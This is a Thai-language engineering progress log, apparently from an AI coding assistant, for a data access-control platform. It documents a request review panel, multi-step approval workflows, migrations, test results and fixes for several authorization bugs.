- เหตุผล: ก่อนหน้านี้ configurer กด Complete GRANT ได้แม้ DENY จะทำให้ grant ไร้ผล → คำขอขึ้น COMPLETED แต่ผู้ขอยังอ่านไม่ได้ = โกหกทั้งสองฝั่ง
- เช็คเฉพาะคนที่ configure ได้จริง — คนอื่นได้คำตอบเดิมของ store (403 "Configured by …") ไม่ได้เห็นผลของ grant check (`grantCheckOnlyForTheConfigurer`)
- `POLICY_UPDATED` / `POLICY_CREATED` **ไม่ถูกเช็ค** ตรงนี้ — มันแค่อ้างถึง policy (ตามข้อ BB.2) review ในหน้า Configure เตือนให้แทน
- `AccessEligibility.blocker()` แตกเป็น `blocking(PolicyDecision)` คืน `DecisionReason` หรือ null → ใช้ร่วมกันทั้งตอนขอ (eligibility) ตอน review และตอน complete

### BC.3 Migration `V24__access_request_ip.sql`

- `ALTER TABLE access_request ADD COLUMN requester_ip text` — IP ที่คำขอถูกส่งมา (`request.getRemoteAddr()` ไม่เชื่อ X-Forwarded-For) · ให้ engine ใช้ตัดสิน rule `context.ipCidr` ตอน review / grant check เหมือนผู้ขอ query จากที่เดิม (`AccessRequestStore.askedFrom(id)`)
- **ไม่เคยออกไปใน response ใดๆ** — create / GET / inbox / mine / review ตรวจแล้วทั้ง unit, IT และ live · review บอกแค่ `addressKnown`
- คำขอเก่าก่อน V24 = null → ตัดสินแบบไม่รู้ IP (เหมือน query ที่ไม่มี address)

### BC.4 Backend

- `access/AccessReview.java` (ใหม่) — ประกอบ review: ผู้ขอ · table · now / ifGranted / ifPolicy · risk · conflict · suggestion · `grantWouldNotOpen` · ค่าคงที่ `LONG_DAYS 30` · `VERY_LONG_DAYS 90` · `SHORTER_DAYS 7` · `PEERS_FOR_POLICY 2` · `HISTORY_WINDOW 90 วัน`
- `policy/DecisionService.java` — `decideWithCandidate` + `Candidate` · `decideAsIfGranted` · refactor `withGrants` ให้ใช้ร่วมกัน · ไม่แตะ cache ของ decision ปกติ
- `access/AccessEligibility.java` — `blocking(PolicyDecision)`
- `access/AccessRequestStore.java` — เก็บ `requester_ip` ตอนสร้าง · `askedFrom(id)` · SELECT ของ view ทุกตัวไม่ดึง column นี้
- `resources/AccessRequestResource.java` — `GET /{id}/review` · `refuseAGrantThatWouldNotOpen` ก่อน complete GRANT
- `DacApplication.java` — ต่อ `AccessReview` เข้า resource

### BC.5 Frontend

- `api/accessRequests.ts` — type `AccessReview` / `ReviewConflict` / `ReviewSuggestion` / `ColumnFate` ... + `fetchAccessReview(id, policyId?)`
- `pages/requests/RequestReview.tsx` (ใหม่) — panel **"Before you answer"** (region `Review`) บนคำขอที่ไม่ใช่ของตัวเองและยังเปิดอยู่: chip risk + factor · ผู้ขอ (attribute / group / role / grant ที่ถือ / คำขอก่อนหน้า) · ตาราง column *"What a grant would open"* (Visible / Masked by … / Hidden · ติดป้าย sensitive) · row filter · conflict list (`ul[aria-label=Conflicts]` · `li[data-code]`) · suggestion พร้อมปุ่ม · footer *"Suggestions only — nothing here changes a policy or a grant."*
- `pages/requests/AccessRequestsPage.tsx` —
  - ผู้ขอไม่เห็น panel review เลย
  - หน้า Configure: เลือก **Grant access** แล้วมี `GRANT_BLOCKED` → โชว์ blocker + **Complete disabled** (server ก็ปฏิเสธ 409 อยู่ดี)
  - เลือก **I updated a policy / I created a policy** + เลือก policy → เรียก review พร้อม `policyId` → โชว์ ConflictList ของ policy นั้น + `<details>` *"What they would see with it active"* · Complete disabled แค่จนกว่าจะพิมพ์ note ที่บังคับ (warning ไม่ block — คนตัดสินรู้ดีกว่า)
  - ปุ่ม **"Open as draft policy"** ของ `CREATE_POLICY_DRAFT` → `navigate('/policies/new', { state: { draft } })`
- `pages/policies/PolicyBuilderPage.tsx` — รับ draft จาก location state → เติมฟอร์ม + ข้อความ *"Drafted from an access request"* · ยังต้องกด save เอง และบันทึกเป็น DRAFT
- ไม่ได้รัน prettier (ไม่มี config — ดู memory) · ไม่มีแถบ `border-l-4` สีฟ้า · ใช้ layout เดิมของหน้า requests

### BC.6 Tests

| ชุด | เพิ่ม | ครอบอะไร |
|---|---|---|
| `AccessReviewTest` (ใหม่) | **17** | tag ที่ specific ที่สุดนับ · คำ / classification ที่แปลว่า sensitive · `Suggested` ไม่นับ · ทุก column มีชะตา + mask บอก policy · refusal บอกชื่อ + id policy · row filter ภาษาคน · DENY = GRANT_BLOCKED + UPDATE_POLICY · sensitive in clear = HIGH + เสนอ 7 วันก่อน · mask ที่เหลือเป็น info · ความยาว / tier / ประวัติ / identity ดัน risk · อ่านได้อยู่แล้ว = DECLINE · peer ถือ grant = draft policy ที่ไม่ active · policy ไม่ครอบ table = blocker · draft ที่จะเปิดได้บอกว่าเปิด และยัง draft · policy ที่ยังปฏิเสธ = warning · policy ไม่มีจริง = blocker · slug ปลอดภัย |
| `AccessRequestResourceTest` | +4 | GRANT ที่ policy ยังปฏิเสธ → 409 ไม่เขียนอะไร · GRANT ที่เปิดได้ผ่าน (policy mode ไม่เช็คตรงนี้) · คนที่ configure ไม่ได้ได้คำตอบของ store · `policyId` ผิดรูป → 400 |
| `AccessRequestIT` `@Nested Reviewing` | +9 (รวม **65**) | DENY = blocker ที่บอก policy และ grant ถูกปฏิเสธ · column-by-column + owner · sensitive + open-ended = HIGH + grant สั้นก่อน · ผู้ขอ 403 / คนนอก 404 · draft ที่จะเปิดได้ยัง draft · policy ไม่ครอบ / ของคนอื่นยังปฏิเสธ · peer ใน group → draft · refusal ก่อนหน้านับ · **IP ตัดสิน rule ipCidr แต่ไม่เคยถูกโชว์** |
| `AccessRequestsPage.test.tsx` | +8 | บอกผู้ขอ / สิ่งที่ grant จะเปิด / risk · ไม่วาด review บนคำขอของตัวเองหรือที่ตอบแล้ว · อ่าน review ไม่ได้ก็ยังตอบได้ · draft group policy เปิดแบบไม่ save · ไม่ให้ complete grant ที่ policy ยังปฏิเสธ + บอกตัวไหน · โชว์เหตุผลที่ server ปฏิเสธ (409) · เช็ค policy ที่เลือกแบบอ่านอย่างเดียว · ไม่ยิงถามขณะยังพิมพ์ id ไม่ครบ |
| `PolicyBuilderPage.test.tsx` | +2 | policy ที่คำขอเสนอเติมฟอร์มและ save เป็น draft ใหม่ · policy ใหม่ธรรมดาไม่มีข้อความเรื่องคำขอ |

**ผลรวม (2026-09-25):** `./mvnw -o verify -Pintegration` **BUILD SUCCESS** · unit **793** (dac-service **288**) · integration **251** · รวม **1044** · Failures 0 Errors 0 · frontend `npx jest src` **37 suites / 357 tests** ผ่าน · `tsc --noEmit` สะอาด · `VITE_BASE=/Arak/ npm run build` ผ่าน

### BC.7 ทดสอบสดบน dev (`flow_review.py` phase a / b + `review-shot.mjs` ใน scratchpad)

รันกับ app ที่ build จาก working tree นี้ (API :8080, UI `http://localhost:8090/Arak/`) — ทั้งสอง phase **RESULT: ALL PASSED** · table `demo-pg.salesdb.sales.customer` (ไม่มี owner → admin ตัดสิน) · ผู้ขอ `analyst_b` (L2, SG) · รหัสผ่าน dev ส่งเป็น env `DEV_PW` เท่านั้น

**Phase a — review ก่อนตอบ และ grant ที่ DENY ทำให้ไร้ผล**
| ขั้น | ผล |
|---|---|
| ก่อนขอ | analyst_b query → 403 (finance-subscription ไม่ผ่าน) |
| ขอ 5 วัน | 201 PENDING · `requester_ip` ถูกเก็บ (loopback) · **ไม่มี address ใน response ของ create / GET ของผู้ขอ / inbox ของ admin** |
| review (admin) | 200 · ไม่มี address · `addressKnown` true · requester analyst_b · `now` ปฏิเสธ / `ifGranted` เปิดได้ · risk **HIGH** [`SENSITIVE_IN_CLEAR`, `REJECTED_BEFORE`] · 9 column `VISIBLE` ทั้งหมด (analyst_b เป็น L2 จึงไม่โดน mask) · row filter `sales-branch-rls` · conflicts [`ROW_FILTERED`] · suggestion [`GRANT`] |
| ใครอ่านได้ | ผู้ขอ → **403** "A review is for the people deciding a request…" · analyst_a (ไม่เกี่ยว) → **404** · `policyId=not-an-id` → **400** · UUID สุ่ม → `POLICY_NOT_FOUND` |
| เช็ค policy | `example-owner` (DRAFT, env dev) → `POLICY_NOT_BOUND` · `finance-subscription` (ACTIVE) → `POLICY_STILL_REFUSES` · **state + version ของทุก policy ไม่เปลี่ยน · คำขอยัง PENDING** |
| approve → start | APPROVED → IN_PROGRESS · สร้าง DENY `demo-review-deny-analyst-b` (user = analyst_b) แล้ว activate |
| review หลัง DENY | `GRANT_BLOCKED` *"A grant would not let analyst_b read this table. Still refusing: demo-review-deny-analyst-b: subject rule satisfied"* + suggestion `UPDATE_POLICY` |
| complete GRANT 2 วัน | **409** *"… Change that policy and finish as \"Policy updated\", or decline."* · **ไม่มีแถว `access_grant`** · ยัง IN_PROGRESS |

**Phase b — เอา DENY ออก แล้ว grant เดิมผ่าน**
| ขั้น | ผล |
|---|---|
| disable DENY | 200 · review เหลือ [`ROW_FILTERED`] ไม่มี blocker |
| complete GRANT 2 วัน | 200 **COMPLETED** |
| หลังได้สิทธิ์ | analyst_b query → **200 `[[1]]`** · DENY ถูก archive เก็บกวาด |
| audit (`audit_access_request`) | REQUEST · VOTE · APPROVE · START · COMPLETE — **ครั้งที่โดน 409 ไม่เขียนอะไร** |

ภาพหน้าจอ (Playwright `review-shot.mjs`, ไม่มี pageerror / 5xx — เก็บใน `shots-rv/` ของ scratchpad ไม่ commit):
- `rv-review-panel.png` — panel "Before you answer" · chip risk **Medium** (หลัง DENY: grant เปิดไม่ได้แล้วจึงไม่มี `SENSITIVE_IN_CLEAR`) · `GRANT_BLOCKED` · footer "Suggestions only"
- `rv-configure-blocked.png` — Configure แบบ Grant access: blocker ซ้ำอยู่ตรงปุ่ม · **Complete disabled**
- `rv-configure-policy.png` — I updated a policy → เลือก finance-subscription → conflict ของ policy นั้น + `<details>` "What they would see with it active" · Complete disabled จนกว่าจะพิมพ์ note
- `rv-requester.png` — analyst_b เปิดคำขอของตัวเอง: **ไม่มี panel review**
- `rv-review-blocked.png` — ทั้งหน้า

### BC.8 ยังไม่ทำ / ต่อไป

- **2c (ต่อทันที)** `GET /v1/access/grants/expiring?withinDays=N` + card dashboard *"ใครใกล้หมดสิทธิ์ใน table ไหน"* พร้อมนับถอยหลัง · **สถิติคำขอต่อ table** (จำนวนขอ / อนุมัติ / ปฏิเสธ / เวลาที่ใช้ตัดสิน — ข้อมูลอยู่ใน `access_request` ครบแล้ว) สำหรับทำ Dashboard ตามที่ผู้ใช้ขอ
- ปุ่ม *"Open as draft policy"* ยังไม่เคยเห็นสดเพราะ dev data ไม่มีคนใน group เดียวกันถือ grant บน table เดียวกัน ≥ 2 คน — jest + IT ครอบแล้ว
- ~~`audit_policy_change` ยังไม่ถูกเขียน~~ — **ปิดแล้วในข้อ CA (V39)**
- Automatic configuration (Roadmap) · recertification · break-glass · email/Teams · review ด้วย LLM (M16 — แยกต่างหาก และ LLM เห็นแค่ metadata ไม่เคย activate policy)

## รอบก่อนหน้า — **ข้อ BB: M9 slice 2a — Access Request Workflow Design Configuration (อนุมัติหลายขั้น · parallel / sequence · ALL / ANY / AT_LEAST n) + Configure ด้วยมือแยกจาก Approve**

ผู้ใช้ขอ: *"กรณีไม่มีคนเป็น owner … ไม่เห็นขึ้นใน platform Admin Inbox เลย"* · *"เพิ่ม Feature ให้ ส่งต่อได้หลายๆคน เพิ่ม Access Request Workflow Design Configuration — Configure การขอเป็น หลาย Step ได้ ทำได้ทั้งแบบ parallel, Sequence (need approve from all, need approve from only one, ..)"* · *"ใน Dashboard ต้องสามารถระบุได้ว่าใครใกล้จะหมดสิทธิใน table ไหน อาจใส่ตัวนับถอยหลังได้"* · *"อยากให้เก็บ สถิติ จำนวนที่ขอใช้ table ไว้ด้วย"* · เรื่อง Reject ในแต่ละ stage: *"ให้เลือกได้ใน Configure"* · admin ตอบแทนทุก stage ได้: *"ต่อ"* · Configure แบบ Manual เป็น default — **Automatic อยู่ Roadmap เท่านั้น** · แล้วสั่ง *"ทำต่อได้เลยนะ เอาตาม Roadmap ทำไปเรื่อยๆ ต้องทดสอบให้ดีทุกขั้นตอน"*

slice 2 แบ่งเป็นสามก้อน — **รอบนี้ทำ 2a จบ** · 2b (หน้า review: ข้อมูลผู้ขอ / impact / risk / suggestion / policy conflict — ทุกอย่างที่มันเสนอเป็น **draft** เท่านั้น) และ 2c (dashboard grant ใกล้หมดอายุ + นับถอยหลัง · สถิติคำขอต่อ table) ยังไม่เริ่ม

### BB.1 โมเดล — step เรียงกัน · stage ใน step เดียวกันวิ่งพร้อมกัน

```
Step 1  ┌ Owner approval   ANY  · VETO    · [Owners of the table]
        └ (stage อื่นใน step 1 ก็วิ่งพร้อมกันได้)
Step 2  ┌ Security         ALL  · VETO    · [security_a]
        └ Compliance       ANY  · QUORUM  · [compliance_a, analyst_b]
→ APPROVED → (configurer กด Start) IN_PROGRESS → COMPLETED (GRANT / POLICY_UPDATED / POLICY_CREATED) หรือ Decline
```

- **Seat** (ใครคือคนถูกถาม): `USER` · `TEAM` (สมาชิกซ้อนกี่ชั้นก็ได้) · `ROLE` (คนที่ถือ app role เหนือ table นี้ — global หรือ scope ที่ครอบ table) · `ASSET_OWNERS` (owner จาก OM) · `DATA_STEWARD` / `DATA_CUSTODIAN` (จาก custom property `dataSteward` / `dataCustodian` ของ table ใน OM)
- **Rule**: `ALL` (ทุกคนที่ถูกถาม) · `ANY` (คนเดียวพอ) · `AT_LEAST n`
- **onReject** (ผู้ใช้สั่งให้เลือกได้ต่อ stage):
  | | ALL | ANY | AT_LEAST n |
  |---|---|---|---|
  | `VETO` | reject ใครก็ได้ = stage ตก | reject ก่อนมีคน approve = ตก | reject ใครก็ได้ = ตก |
  | `QUORUM` | (เหมือน VETO — ALL ขาดคนเดียวก็ไม่ครบแล้ว) | ตกเมื่อ **ทุกคน** reject | ตกเมื่อ approve ที่เหลือ **ไม่มีทางถึง n** แล้ว |
  | `FIRST_RESPONSE` | ❌ ปฏิเสธตอนบันทึก (400) | คำตอบแรกตัดสิน ทางไหนก็ได้ | ❌ ปฏิเสธ (400) |
- **stage ตก = request ตก (REJECTED)** ทันที · stage อื่นใน step เดียวกันที่ยังเปิดอยู่ถูกปิด (`CLOSED`)
- **admin ตอบแทน stage ไหนก็ได้** — ถ้าไม่ได้อยู่ใน pool ของ stage นั้น คำตอบถูกบันทึกเป็น **override** และตัดสิน stage ทันที (ผู้ใช้ยืนยัน *"ต่อ"*)
- **ไม่มีใครตัดสินคำขอของตัวเอง** — ผู้ขอถูกตัดออกจากทุก pool เสมอ (รวม admin ที่ขอเอง)
- **pool ถูก resolve ตอน step นั้นเปิด** แล้ว freeze ไว้ใน `access_request_stage.pool` → *"ALL"* แปลว่าทุกคนที่ถูกถาม ไม่ใช่ตัวเลขที่ขยับตามคนเข้าออก team
- **seat ไม่ resolve เป็นใครเลย → pool = platform admin** (`fallback = true`) — นี่คือตัวแก้ของเคสที่ผู้ใช้รายงาน *"ไม่มี owner → ไม่ขึ้นใน Inbox ของ admin"*
- **pool มีคนแต่ไม่พอให้ rule ผ่านได้** (เช่น AT_LEAST 3 แต่มี 2 คน) → stage **stranded** รอ admin — หน้าขอสิทธิ์บอกผู้ขอตั้งแต่ก่อนกดส่ง
- request **copy workflow ไว้ตอนสร้าง** (`workflow_id` + `workflow_name` + stage + `configurers`) → แก้ workflow ทีหลัง **ไม่เปลี่ยนกติกาของคำขอที่เดินอยู่แล้ว** (IT `keepsItsCopy`)
- scope: workflow ผูกกับ FQN ใดก็ได้ (service / database / schema / table) — **ตัวที่ลึกที่สุดชนะ เทียบทีละ segment** ไม่ใช่ `LIKE` · `scope_fqn = null` = default ขององค์กร · ไม่มีเลย = **Built-in** (owner คนใดคนหนึ่ง แล้ว owner หรือ data custodian configure) · workflow ที่ `enabled = false` ถูกข้ามไปหาชั้นบน

### BB.2 Approve ≠ ให้สิทธิ์ — Configure ด้วยมือ (MANUAL)

- `APPROVED` ตอนนี้แปลว่า *"ผู้อนุมัติตอบ yes แล้ว รอคน configure"* — **ยังอ่านไม่ได้** (flow จริงยืนยันว่า query ยัง 403)
- configurer (seat เหมือนกัน — default: `ASSET_OWNERS` + `DATA_CUSTODIAN`) กด **Start** → `IN_PROGRESS` + `assignee` → **Complete** เลือก:
  - `GRANT` — เขียน grant ตามจำนวนวัน (**ไม่เกินที่ผู้ขอขอ** — เกิน = 400) · ตรงนี้คือที่ช่อง "Grant for … days" ย้ายมาอยู่ (ข้อ BA)
  - `POLICY_UPDATED` / `POLICY_CREATED` — **แค่ชี้ไปที่ policy (`fulfilment_ref`) ไม่ activate อะไรเอง** ตามกติกา "suggestion เป็น draft เท่านั้น"
  - หรือ **Decline** (configurer ปฏิเสธหลังอนุมัติ พร้อมเหตุผล)
- ผู้ขอ withdraw ได้ทั้งก่อนและหลังอนุมัติ (ก่อน COMPLETED)
- **Automatic configuration = Roadmap เท่านั้น** — `access_workflow.fulfilment` มี CHECK ให้เป็น `MANUAL` ได้ค่าเดียว

### BB.3 Migration `V23__access_workflow.sql`

| | |
|---|---|
| `access_workflow` | name · description · `scope_fqn` (unique บน `coalesce(scope_fqn,'')` = หนึ่ง workflow ต่อ scope รวม default) · enabled · `stages` jsonb · `configurers` jsonb · `fulfilment` = `MANUAL` |
| `audit_access_workflow` | append-only — CREATE / UPDATE / DELETE พร้อม before / after |
| `access_request` + | `workflow_id/name` · `configurers` · `configurer_pool` · `current_step` · `assignee/assigned_at` · `completed_by/at` · `fulfilment` · `fulfilment_ref` · `fulfilment_note` |
| status | `PENDING / APPROVED / IN_PROGRESS / COMPLETED / REJECTED / WITHDRAWN` · **แถว APPROVED เดิมถูกย้ายเป็น `COMPLETED + GRANT`** (โดยคนที่ approve ตอนนั้น) · constraint ใหม่: มี grant ⇔ fulfilment = GRANT · COMPLETED ⇔ มี fulfilment + completed_by/at · IN_PROGRESS ⇔ มี assignee |
| one-open index | ครอบ `PENDING / APPROVED / IN_PROGRESS` — ยังเป็นหนึ่งคำขอที่เปิดอยู่ต่อคนต่อ table |
| `access_request_stage` | หนึ่งแถวต่อ stage ต่อ request · `pool` · `fallback` · `WAITING / OPEN / APPROVED / REJECTED / CLOSED` |
| `access_request_vote` | หนึ่งคำตอบต่อคนต่อ stage · override ของ admin บันทึกว่าเป็น override |

### BB.4 Backend

| ไฟล์ | หน้าที่ |
|---|---|
| `access/AccessWorkflow.java` | record `Seat` / `Stage` / `Workflow` / `Draft` + validator (ชื่อ stage ห้ามซ้ำ · step เรียงใหม่ให้ชิดกันเป็น 1..n เอง (1, 3 → 1, 2) · AT_LEAST ต้องมี `minApprovals` 1–100 (หน้าจอตั้งต้นที่ 2) · FIRST_RESPONSE ต้องคู่ ANY · seat ≤ 25 ต่อ stage · USER / TEAM / ROLE ต้องมีชื่อ · ROLE ต้องเป็น app role ที่มีจริง) + `builtIn()` + `roleLabel()` |
| `access/StageEngine.java` | **pure** — รับ stage + vote แล้วตอบ `PASSED / FAILED / OPEN / STRANDED` ตามตารางใน BB.1 |
| `access/ApproverDirectory.java` | seat → คน (`Member{username, via}`) บน asset หนึ่งๆ · ตัดผู้ขอออก · ว่าง → admin (`fallback`) · อ่าน steward / custodian จาก custom property (string / entity reference / list) |
| `access/WorkflowStore.java` | CRUD + audit + `effective(fqn)` (ลึกสุดชนะ ทีละ segment) |
| `resources/AccessWorkflowResource.java` | `GET /v1/access-workflows` (admin · author · owner · auditor — คนอื่น 403) · `GET /effective/{fqn}` · `POST` 201 · `PUT /{id}` · `DELETE /{id}` 204 · `GET /{id}/history` · validation → 400 · scope ชน → 409 · **สร้าง/แก้ได้เฉพาะคนที่ `governs` scope นั้น** (default ขององค์กร = PLATFORM_ADMIN เท่านั้น) |
| `access/AccessRequestStore.java` · `resources/AccessRequestResource.java` | เดินตาม stage · `/start` · `/complete {fulfilment, days, note}` · `/decline` · inbox บอก `mayDecide` / `mayConfigure` ต่อแถว · กระดิ่งแจ้งทุกครั้งที่ step เปลี่ยน / ถึงคิว configure |
| `access/AccessEligibility.java` · `resources/QueryResource.java` | refusal ของ query และ `/eligibility/{fqn}` พก **`route`** = workflow ที่จะใช้ + stage + คนที่จะถูกถาม · `stranded` ถ้าไม่มีทางผ่าน |

### BB.5 Frontend

- **หน้าใหม่ `/settings/workflows`** (`AccessWorkflowsPage.tsx`) — การ์ด *Access workflows* ในกลุ่ม *People & platform access* ของ Settings · **ซ่อนจาก Requester** (จะโดน 403) · รายการ: default ขึ้นก่อน · Built-in แสดงเสมอ · ป้าย *Off* · ประวัติการแก้ต่อ workflow
  - editor: ชื่อ · scope (ScopePicker ค้น catalog) · step → stage (rule / min / onReject — FIRST_RESPONSE ถูก disable เมื่อไม่ใช่ ANY และ reset เป็น VETO เอง) · seat (ค้นคน/ทีมจาก principal) · configurers · preview *"Step 2 runs Security and Compliance side by side"*
  - Auditor อ่านได้อย่างเดียว ไม่มีปุ่ม
- `RequestAccess` (หน้า Query) + `AssetRequestAccess` (หน้า asset) — บอก **"who decides"** เป็นลำดับ step ก่อนกดส่ง และบอก stranded
- `AccessRequestsPage` — แถวบอก step ปัจจุบัน + stage ละคนละสถานะ · ปุ่ม Start / Complete (GRANT พร้อมจำนวนวัน · POLICY_UPDATED / POLICY_CREATED พร้อม ref) / Decline · กระดิ่ง (`useRequestNotices`, `TopNav`) นับงาน configure ด้วย
- **ชื่อ role อ่านออก**: เดิมขึ้น *"Role AUDITOR"* → ตอนนี้ *"Role Auditor"* / *"Role Data owner"* ทั้ง backend (`AccessWorkflow.roleLabel`) และ frontend (`roleLabel` ใน `api/accessRequests.ts`) — กระทบ `via` ของ pool ในคำขอใหม่เท่านั้น (แถวเก่าเก็บข้อความเดิมไว้)

### BB.6 Tests

- Backend unit **dac-service 267** (+59): `StageEngineTest` 23 (ทุกช่องของตาราง BB.1 + override + stranded) · `AccessWorkflowTest` 12 · `ApproverDirectoryTest` 5 · `AccessRequestResourceTest` 5 · `AccessWorkflowResourceTest` 14
- Integration **`AccessRequestIT` 56** (+25) บน Postgres จริง — `Workflows` (sequence · parallel · twoSeats · ANY/QUORUM · ANY/VETO · FIRST_RESPONSE · AT_LEAST/QUORUM · AT_LEAST/VETO · ALL rejects · adminOverride · fallback · strandedRule · seats · keepsItsCopy · scopes · denyAfterSteps · gateHidesTheRoute) · `Configuring` (startAndFinish · policyFulfilment — ไม่ activate policy · decline · withdrawBeforeConfigured) · `Legacy` (แถว V21 ที่ migrate มา: lazyPool · lazyConfigurers · stageless · newOwnerHearsNothingOld) · และ policy ชนกันยังครบเหมือนเดิม (DENY · ชั้นบนปฏิเสธ · override · approve ไม่ปลด mask)
- `PolicyBindingMaterializerIT` / `PolicyOverviewIT` — แก้ `TRUNCATE` ให้ครอบตารางใหม่ (ไม่งั้น FK จาก `access_request_stage` ค้าง)
- Frontend **37 suites / 347 tests** — ใหม่ `AccessWorkflowsPage.test.tsx` 17 · ปรับ `RequestAccess` / `AssetRequestAccess` / `AccessRequestsPage` / `RequestNotices`

### BB.7 ทดสอบสดบน dev (`flow_workflow.py` ใน scratchpad)

รันกับ app ที่ build จาก working tree นี้ (API :8080, UI `http://localhost:8090/Arak/`) — ผล **RESULT: ALL PASSED** · user dev: `analyst_a`, `analyst_b`, `owner_a`, `security_a`, `compliance_a` (รหัสผ่าน dev ส่งเป็น env `DEV_PW` เท่านั้น ไม่อยู่ในไฟล์ใด) — `security_a` / `compliance_a` สร้างใหม่รอบนี้เป็น local user ธรรมดา (role Requester)

**Part A — `dtp-iprm.iprm.public.kb_likes` + workflow "Demo two-step"** (step 1 Owner approval ANY/VETO · step 2 Security ALL/VETO ‖ Compliance ANY/QUORUM [compliance_a, analyst_b] · configured by owner_a)
| ขั้น | ผล |
|---|---|
| ออกแบบ | FIRST_RESPONSE + ALL → 400 · สร้าง → 201 · scope ซ้ำ → 409 "A workflow already covers … edit that one" · requester `GET /v1/access/workflows` → 403 · `effective` คืน Demo two-step |
| ก่อนขอ | eligibility โชว์ route ครบ 2 step · `requestable` true · `stranded` false |
| ขอ | analyst_a → PENDING · pool ของ step 1 = owner_a เท่านั้น (ตัดคนขอออก; owner อีกคนของ table ตัดออกจาก output เป็น `<another owner>`) |
| step 1 | security_a approve ก่อนถึงคิว → **404** (ไม่ได้ถูกถาม = ไม่บอกว่ามี request) · owner_a approve → ADVANCE เปิด step 2 |
| step 2 | analyst_b reject Compliance → ยัง `OPEN` (QUORUM: compliance_a ยังอนุมัติได้) · compliance_a approve → Compliance APPROVED · security_a approve → request **APPROVED** |
| Configure | security_a กด start → 403 "Configured by owner_a" · query ยังถูกปฏิเสธ (approve ≠ ให้สิทธิ์) · owner_a start → IN_PROGRESS (assignee owner_a) · complete GRANT 3 วัน → COMPLETED + มีแถวใน `access_grant` |
| audit | REQUEST · VOTE · ADVANCE · VOTE(reject) · VOTE · VOTE · APPROVE · START · COMPLETE |

> ⚠️ **ข้อจำกัดของ dev data ไม่ใช่ bug:** query `kb_likes` หลังได้ grant ยังตอบ 403 "not a governed asset on this source" เพราะ source `arak-live-pg` คือ arakdb ไม่ใช่ service `dtp-iprm` ใน OM — table ของ dtp-iprm จึงไม่ถูก map กับ source ใดเลย proxy ปฏิเสธก่อนดู policy/grant (fail-closed ตามแบบ) → Part B พิสูจน์การอ่านจริงบน table ที่ map แล้ว

**Part B — `demo-pg.salesdb.sales.customer` (ไม่มี owner) = เคสที่ผู้ใช้แจ้งว่าไม่ขึ้นใน Inbox ของ admin**
| ขั้น | ผล |
|---|---|
| ก่อนขอ | analyst_b query → 403 (finance-subscription: expression ประเทศไม่ผ่าน) · refusal มี `requestable` true + `route` Built-in |
| ขอ 5 วัน | 201 PENDING · stage `fallback` true · pool = `[admin]` · **อยู่ใน Inbox ของ admin พร้อม `mayDecide`** · กระดิ่งนับ (`inboxPending` 3) |
| admin | approve → APPROVED (query ยัง 403) · start → IN_PROGRESS · GRANT 9 วัน → **400** "The request asked for 5 days; a grant can shorten that, not extend it" · GRANT 2 วัน → COMPLETED |
| หลังได้สิทธิ์ | analyst_b query → **200 `[[1]]`** (count หลัง policy ของ table กรองแล้ว) |

ข้อสังเกตเล็ก: refusal ของ table ที่ไม่มี owner คืน `approvers` ว่าง ขณะที่ route เขียน "Owners of the table" — ไม่ stranded เพราะ fallback ไป admin เกิดตอนสร้าง request (UI ขึ้นข้อความ "No owner is recorded for this table, so a platform administrator decides." อยู่แล้ว)

ภาพหน้าจอ (Playwright, ไม่มี pageerror / 5xx): `/settings` การ์ด Access workflows เห็นเฉพาะ admin/steward (analyst_a ไม่เห็น) · `/settings/workflows` list + editor ของ Demo two-step · `/requests` ของ analyst_a แสดง Step 1 → Step 2 · in parallel พร้อมคะแนนเสียงทีละคน และ "owner_a granted access"

### BB.8 ยังไม่ทำ / ต่อไป

- **2b** หน้า review ของคำขอ: ข้อมูลผู้ขอ (attribute / group / role / สิทธิ์ที่มีอยู่) · impact · risk · suggestion ว่าต้องแก้/สร้าง policy ไหน · **คำเตือน policy conflict ตอน configure** — ทุกอย่างเป็น draft ห้าม activate เอง
- **2c** `GET /v1/access/grants/expiring?withinDays=N` + หน้า dashboard นับถอยหลัง · สถิติคำขอต่อ table (ข้อมูลอยู่ใน `access_request` ครบแล้ว)
- Automatic configuration (Roadmap) · recertification · break-glass · email/Teams

## รอบก่อนหน้า — **ข้อ BA: ตรวจบั๊ก Access Control (ผู้ใช้สั่ง "ตรวจหา Bug Access Control") · เอาแถบขอบซ้ายสีน้ำเงินออกทั้งแอป · เอาช่อง "Grant for … days" ออกจากการ Approve**

ผู้ใช้ขอ: *"ตรวจหา Bug Access Control และทำตาม milestone ต่อ"* · *"แถบแบบนี้ดูเหมือน AI ทำมากไป"* / *"ไม่เอาขอบด้านหน้าสีน้ำเงิน เพราะมันเหมือน AI เป็นคนทำ"* · *"ตรง grant for ไม่ต้องใส่ก็ได้อะ"*

### BA.1 🐛 บั๊กที่เจอ — ทุกตัว "เช็ค role แต่ลืมเช็ค scope" (มีแค่ `PolicyResource` ที่เทียบ scope)

| # | จุด | บั๊ก | แก้ |
|---|---|---|---|
| A | `POST /v1/access/grants` | **ให้สิทธิ์ตัวเองได้** (หรือให้ group ที่ตัวเองอยู่ — ทางอ้อม) ทุก role รวม admin — ข้ามกติกา "Nobody decides their own request" ของ flow ขอสิทธิ์ | `GrantStore.reaches(username, principalId)` — recursive CTE เดียวกับ `heldBy` (ตัวเอง + group ทุกชั้น) → 403 *"Nobody grants themselves access"* |
| B | `POST /v1/access/grants` · `POST /grants/{id}/revoke` | DATA_OWNER ของ `prod.Sales` **grant/revoke บน `prod.HR` ได้** | `Stewardship.governs(caller, fqn)` · revoke หา grant ด้วย `grants.find(id)` ก่อน (ไม่มี → 404 ไม่ใช่ 403) |
| E | `POST /v1/decisions` (simulator "View as") | DATA_OWNER จำลองคนอื่นบน table ที่ไม่ได้เป็นเจ้าของได้ = อ่านแผนที่สิทธิ์ทั้งองค์กร | `Stewardship.oversees` — admin/author ทุกที่ · owner เฉพาะ scope · AUDITOR ทุกที่ (อ่านอย่างเดียว) · ถามเรื่องตัวเองได้เสมอ |
| F | `/v1/enforcement/secure-views` list · `/state` · `/dry-run` | DATA_OWNER เห็น/dry-run ทุก table | list กรองเหลือเฉพาะที่ `governs` · state + dry-run → 403 นอก scope · apply/rollback เป็น PLATFORM_ADMIN อยู่แล้ว |
| G | `AccessRequestStore.mayDecide` | owner เทียบชื่อทั้ง `who.is(name) \|\| who.hasTeam(name)` ไม่ดู `owner_type` → **สมาชิกของ team ชื่อ `owner_o` ตัดสินคำขอบน table ที่ *user* `owner_o` เป็นเจ้าของได้** (และ user ชื่อ `finance` ตัดสินแทน team Finance) | `owner_type = 'team'` → `hasTeam` เท่านั้น · `'user'` → `is` เท่านั้น |

